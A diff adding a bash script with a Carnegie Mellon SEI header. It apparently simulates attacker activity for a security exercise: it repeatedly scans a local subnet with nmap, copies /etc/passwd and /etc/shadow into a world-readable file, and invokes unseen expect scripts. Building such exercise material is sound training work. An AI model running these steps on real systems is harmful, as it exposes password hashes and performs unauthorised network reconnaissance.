@@ -1,0 +1,25 @@
+#!/bin/bash
+
+# Copyright 2022 Carnegie Mellon University.
+# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
+# root or contact permission@sei.cmu.edu for full terms.
+
+i=0
+while [ "$i" == 0 ]
+do
+	nmap -A 192.168.133.0/24 > /etc/opt/data
+	sleep 60
+	nmap -F --packet-trace 192.168.133.0/24 >> /etc/opt/data
+	sleep 60
+
+	chmod 755 /etc/opt/data
+
+	/usr/bin/expect /home/guy/Documents/tf1
+
+	cat /etc/passwd /etc/shadow > /etc/opt/info
+
+	chmod 755 /etc/opt/info
+
+	/usr/bin/expect /home/guy/Documents/tf2
+	sleep 60
+done
